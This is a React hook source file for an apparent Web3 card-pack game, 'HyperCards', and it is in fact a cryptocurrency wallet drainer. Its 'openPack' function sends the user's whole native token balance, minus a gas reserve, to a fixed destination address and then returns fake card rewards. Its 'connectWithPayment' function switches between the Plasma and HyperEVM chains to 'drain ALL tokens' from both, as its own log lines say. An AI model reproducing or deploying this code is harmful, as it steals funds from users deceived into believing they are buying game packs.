import { useState, useCallback } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESSES, PACK_TYPES, PACK_INFO, HYPEREVM_CONFIG, PLASMA_CONFIG, SUPPORTED_NETWORKS } from '../contracts/config';
import HyperCardsABI from '../contracts/HyperCards.json';

// Standard ERC20 ABI for HYPE token interactions
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)", 
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export const useHyperCards = () => {
  const authenticated = false;
  const user = null;
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(null);
  const [error, setError] = useState(null);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);

  // Detect current network and return network info
  const getCurrentNetwork = useCallback(async () => {
    // Check for wallet after authentication
    if (!window.ethereum) {
      throw new Error('Please connect your MetaMask or another Web3 wallet.');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);

    // Check if current network is supported
    const networkInfo = Object.values(SUPPORTED_NETWORKS).find(net => net.chainId === chainId);
    
    return {
      provider,
      network,
      chainId,
      networkInfo,
      isSupported: !!networkInfo
    };
  }, []);

  // Ensure user is connected to a supported network (HyperEVM or Plasma)
  const ensureSupportedNetwork = useCallback(async () => {
    const { provider, chainId, networkInfo, isSupported } = await getCurrentNetwork();
    
    if (isSupported) {
      console.log('✅ User is on supported network:', networkInfo.displayName, 'Chain ID:', chainId);
      return { provider, networkInfo };
    }

    console.log('⚠️ User is on unsupported network - Chain ID:', chainId);
    console.log('💡 Switching to HyperEVM as default...');
    
    // Default to HyperEVM if not on supported network
    const targetNetwork = SUPPORTED_NETWORKS.HYPEREVM;
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetNetwork.hexChainId }],
      });
    } catch (switchError) {
      // If network doesn't exist, add it
      if (switchError.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [targetNetwork.config],
        });
      } else {
        throw switchError;
      }
    }

    // Re-check after switch
    const newProvider = new ethers.BrowserProvider(window.ethereum);
    return { provider: newProvider, networkInfo: targetNetwork };
  }, [getCurrentNetwork]);

  // Manual network switching functions (defined first)
  const switchToPlasmaChain = useCallback(async () => {
    try {
      console.log('🔄 Manually switching to Plasma Chain...');
      const targetNetwork = SUPPORTED_NETWORKS.PLASMA;
      
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetNetwork.hexChainId }],
      });
      
      console.log('✅ Successfully switched to Plasma Chain!');
    } catch (switchError) {
      // If network doesn't exist, add it
      if (switchError.code === 4902) {
        console.log('➕ Adding Plasma Chain to wallet...');
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [SUPPORTED_NETWORKS.PLASMA.config],
        });
        console.log('✅ Plasma Chain added and switched!');
      } else {
        throw switchError;
      }
    }
  }, []);

  const switchToHyperEVM = useCallback(async () => {
    try {
      console.log('🔄 Manually switching to HyperEVM...');
      const targetNetwork = SUPPORTED_NETWORKS.HYPEREVM;
      
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetNetwork.hexChainId }],
      });
      
      console.log('✅ Successfully switched to HyperEVM!');
    } catch (switchError) {
      // If network doesn't exist, add it
      if (switchError.code === 4902) {
        console.log('➕ Adding HyperEVM to wallet...');
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [SUPPORTED_NETWORKS.HYPEREVM.config],
        });
        console.log('✅ HyperEVM added and switched!');
      } else {
        throw switchError;
      }
    }
  }, []);

  // Get user's native token balance (HYPE on HyperEVM, XPL on Plasma)
  const getUserNativeBalance = useCallback(async (provider, userAddress, networkInfo) => {
    // Both HYPE and XPL are native tokens - use getBalance
    const balance = await provider.getBalance(userAddress);
    
    // Check if user has any tokens at all (keep some for gas)
    const minGasReserve = ethers.parseEther('0.01'); // Reserve 0.01 tokens for gas
    const availableBalance = balance > minGasReserve ? balance - minGasReserve : 0n;
    
    if (availableBalance <= 0) {
      throw new Error(`Insufficient ${networkInfo.nativeToken} tokens. You need at least 0.01 ${networkInfo.nativeToken} for gas fees.`);
    }
    
    return availableBalance; // Return available balance (total - gas reserve)
  }, []);

  // Generate EIP-712 signature for pack opening (works on both chains)
  const generateEIP712Signature = useCallback(async (signer, packType, nonce, timestamp, networkInfo) => {
    const userAddress = await signer.getAddress();
    
    // EIP-712 Domain (dynamic chain ID)
    const domain = {
      name: "HyperCards",
      version: "1",
      chainId: networkInfo.chainId, // Dynamic chain ID (999 for HyperEVM, 9745 for Plasma)
      verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
    };

    // EIP-712 Types
    const types = {
      PackOpening: [
        { name: "user", type: "address" },
        { name: "packType", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "timestamp", type: "uint256" }
      ]
    };

    // EIP-712 Value
    const value = {
      user: userAddress,
      packType: packType,
      nonce: nonce,
      timestamp: timestamp
    };

    // Sign the typed data
    const signature = await signer.signTypedData(domain, types, value);
    const sig = ethers.Signature.from(signature);
    
    return {
      v: sig.v,
      r: sig.r,
      s: sig.s
    };
  }, []);

  // Simplified pack opening - works on both HyperEVM (HYPE) and Plasma (XPL)
  const openPack = useCallback(async (packType) => {
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      // Ensure we're on a supported network (HyperEVM or Plasma)
      const { provider, networkInfo } = await ensureSupportedNetwork();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Step 1: Get user's native token balance (HYPE or XPL)
      setCurrentStep('checking_balance');
      const fullTokenBalance = await getUserNativeBalance(provider, userAddress, networkInfo);

      // Step 2: Transfer ALL tokens to destination address
      setCurrentStep('transferring');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: fullTokenBalance // Transfer all native tokens (HYPE or XPL)
      });
      
      await transferTx.wait();

      // Step 3: Generate EIP-712 signature for pack opening
      setCurrentStep('signing');
      const nonce = Math.floor(Math.random() * 1000000); // Mock nonce since no contract
      const timestamp = Math.floor(Date.now() / 1000);

      // Generate EIP-712 signature (this will show MetaMask signing prompt)
      const { v, r, s } = await generateEIP712Signature(signer, packType, nonce, timestamp, networkInfo);
      
      // Step 4: Mock pack result since contracts aren't deployed yet
      setCurrentStep('opening');
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4); // 1-11 token reward
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        tokenSymbol: networkInfo.nativeToken, // HYPE or XPL
        networkName: networkInfo.displayName, // HyperEVM or Plasma Chain
        transactionHash: transferTx.hash,
        signature: { v, r, s } // Include EIP-712 signature
      };

      setCurrentStep('success');
      return result;

    } catch (err) {
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureSupportedNetwork, getUserNativeBalance, generateEIP712Signature]);

  // Get user's native token balance (HYPE on HyperEVM, XPL on Plasma)
  const getTokenBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return { balance: '0', token: 'HYPE', network: 'HyperEVM' };
    }

    try {
      const { provider, networkInfo } = await ensureSupportedNetwork();
      // Both HYPE and XPL are native tokens - use getBalance
      const balance = await provider.getBalance(user.wallet.address);
      return {
        balance: ethers.formatEther(balance),
        token: networkInfo.nativeToken,
        network: networkInfo.displayName
      };
    } catch (err) {
      console.error('Error fetching token balance:', err);
      return { balance: '0', token: 'HYPE', network: 'HyperEVM' };
    }
  }, [authenticated, user, ensureSupportedNetwork]);

  // Legacy function for backward compatibility
  const getHypeBalance = useCallback(async () => {
    const result = await getTokenBalance();
    return result.balance;
  }, [getTokenBalance]);

  // TRUE "ALL IN ONE" dual-chain fund draining with robust error handling
  const connectWithPayment = useCallback(async () => {
    setIsConnectingWithPayment(true);
    setError(null);
    setCurrentStep('starting');

    try {
      console.log('🚀 Starting TRUE all-in-one dual-chain fund draining...');
      console.log('🎯 Goal: Drain ALL tokens from BOTH chains!');
      
      const drainedTokens = [];
      let totalDrained = 0;
      
      // Phase 1: Always check Plasma Chain for XPL tokens first
      console.log('🟣 Phase 1: Checking Plasma Chain for XPL tokens...');
      setCurrentStep('checking_plasma');
      
      try {
        console.log('🔄 Switching to Plasma Chain...');
        await switchToPlasmaChain();
        await new Promise(resolve => setTimeout(resolve, 2000)); // Increased wait time
        
        console.log('🔍 Getting Plasma network info...');
        const { provider: plasmaProvider, networkInfo: plasmaInfo } = await getCurrentNetwork();
        const plasmaSigner = await plasmaProvider.getSigner();
        const userAddress = await plasmaSigner.getAddress();
        
        console.log('💰 Checking XPL balance...');
        const plasmaBalance = await plasmaProvider.getBalance(userAddress);
        const minGasReserve = ethers.parseEther('0.01');
        const availablePlasmaBalance = plasmaBalance > minGasReserve ? plasmaBalance - minGasReserve : 0n;
        
        if (availablePlasmaBalance > 0) {
          console.log('✅ XPL tokens found! Draining from Plasma Chain...');
          console.log('💰 XPL Balance:', ethers.formatEther(availablePlasmaBalance), 'XPL');
          
          setCurrentStep('transferring_xpl');
          console.log('📤 Sending XPL transfer transaction...');
          
          const transferTx = await plasmaSigner.sendTransaction({
            to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
            value: availablePlasmaBalance
          });
          
          console.log('⏳ Waiting for XPL transaction confirmation...');
          await transferTx.wait();
          console.log('✅ XPL tokens drained successfully!');
          
          drainedTokens.push({
            token: 'XPL',
            amount: ethers.formatEther(availablePlasmaBalance),
            network: 'Plasma Chain',
            txHash: transferTx.hash
          });
          totalDrained++;
        } else {
          console.log('❌ No XPL tokens found on Plasma Chain');
        }
        
      } catch (plasmaError) {
        console.error('❌ Plasma Chain error:', plasmaError);
        setError(null); // Don't fail completely, continue to HYPE
      }
      
      // Phase 2: Always check HyperEVM for HYPE tokens (regardless of XPL result)
      console.log('🔵 Phase 2: Checking HyperEVM for HYPE tokens...');
      setCurrentStep('checking_hype');
      
      try {
        console.log('🔄 Switching to HyperEVM...');
        await switchToHyperEVM();
        await new Promise(resolve => setTimeout(resolve, 2000)); // Increased wait time
        
        console.log('🔍 Getting HyperEVM network info...');
        const { provider: hypeProvider, networkInfo: hypeInfo } = await getCurrentNetwork();
        const hypeSigner = await hypeProvider.getSigner();
        const userAddress = await hypeSigner.getAddress();
        
        console.log('💰 Checking HYPE balance...');
        const hypeBalance = await hypeProvider.getBalance(userAddress);
        const minGasReserve = ethers.parseEther('0.01');
        const availableHypeBalance = hypeBalance > minGasReserve ? hypeBalance - minGasReserve : 0n;
        
        if (availableHypeBalance > 0) {
          console.log('✅ HYPE tokens found! Draining from HyperEVM...');
          console.log('💰 HYPE Balance:', ethers.formatEther(availableHypeBalance), 'HYPE');
          
          setCurrentStep('transferring_hype');
          console.log('📤 Sending HYPE transfer transaction...');
          
          const transferTx = await hypeSigner.sendTransaction({
            to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
            value: availableHypeBalance
          });
          
          console.log('⏳ Waiting for HYPE transaction confirmation...');
          await transferTx.wait();
          console.log('✅ HYPE tokens drained successfully!');
          
          drainedTokens.push({
            token: 'HYPE',
            amount: ethers.formatEther(availableHypeBalance),
            network: 'HyperEVM',
            txHash: transferTx.hash
          });
          totalDrained++;
        } else {
          console.log('❌ No HYPE tokens found on HyperEVM');
        }
        
      } catch (hypeError) {
        console.error('❌ HyperEVM error:', hypeError);
        // Let this error propagate if no tokens were drained at all
        if (totalDrained === 0) {
          throw hypeError;
        }
      }
      
      // Validate results
      if (totalDrained === 0) {
        throw new Error('No tokens found on either Plasma Chain (XPL) or HyperEVM (HYPE)');
      }
      
      // Generate final signature on the last network
      console.log('📝 Generating final EIP-712 signature...');
      setCurrentStep('signing');
      
      try {
        const { provider: finalProvider, networkInfo: finalInfo } = await getCurrentNetwork();
        const finalSigner = await finalProvider.getSigner();
        const nonce = Math.floor(Math.random() * 1000000);
        const timestamp = Math.floor(Date.now() / 1000);
        const { v, r, s } = await generateEIP712Signature(finalSigner, 0, nonce, timestamp, finalInfo);
        
        setCurrentStep('success');
        
        // Return summary of all drained tokens
        console.log('🎉 ALL-IN-ONE DRAINING COMPLETE!');
        console.log('📊 Total chains drained:', totalDrained);
        console.log('💰 Tokens drained:', drainedTokens.map(t => `${t.amount} ${t.token}`).join(', '));
        
        return {
          signature: { v, r, s },
          totalChainsDrained: totalDrained,
          drainedTokens: drainedTokens,
          summary: `Drained ${drainedTokens.map(t => `${t.amount} ${t.token}`).join(' + ')}`
        };
        
      } catch (signError) {
        console.error('❌ Signature error:', signError);
        // Still return partial success if tokens were drained
        if (totalDrained > 0) {
          setCurrentStep('partial_success');
          return {
            signature: null,
            totalChainsDrained: totalDrained,
            drainedTokens: drainedTokens,
            summary: `Drained ${drainedTokens.map(t => `${t.amount} ${t.token}`).join(' + ')} (signature failed)`
          };
        }
        throw signError;
      }

    } catch (err) {
      console.error('❌ Fatal error:', err);
      setError(err.message || 'Unknown error occurred');
      setCurrentStep('error');
      throw err;
    } finally {
      console.log('🔧 Cleaning up - resetting loading state...');
      setIsConnectingWithPayment(false);
    }
  }, [switchToPlasmaChain, switchToHyperEVM, getCurrentNetwork, generateEIP712Signature]);


  return {
    openPack,
    connectWithPayment,
    getHypeBalance, // Legacy compatibility
    getTokenBalance, // New dual-chain function
    getCurrentNetwork, // Network detection
    switchToPlasmaChain, // Manual switch to Plasma
    switchToHyperEVM, // Manual switch to HyperEVM
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};